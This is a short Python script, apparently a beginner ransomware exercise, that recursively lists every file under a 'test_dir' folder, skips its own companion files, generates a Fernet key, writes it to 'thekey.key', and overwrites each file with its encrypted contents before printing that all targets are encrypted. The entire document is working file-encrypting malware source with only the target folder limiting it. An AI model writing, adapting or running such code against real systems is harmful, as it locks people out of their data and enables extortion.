import os , sys
from cryptography.fernet import Fernet

files = []
root_dir = 'test_dir'

def list_files(base_dir):
    for file in os.listdir(base_dir):
        if file == "Ransomware.py" or file == "ransom" or file == "thekey.key" or file == "Decrypt.py" or file == sys.argv[0]:
            continue
        if os.path.isdir(os.path.join(base_dir, file)):
            list_files(os.path.join(base_dir, file))
        elif os.path.isfile(os.path.join(base_dir, file)):
            files.append(os.path.join(base_dir, file))

list_files(root_dir)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb")as thekey:
    thekey.write(key)

for file in files:
    with open (file, "rb") as thefile:
        contents = thefile.read()
    Contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(Contents_encrypted)

print("All target files have been encrypted.")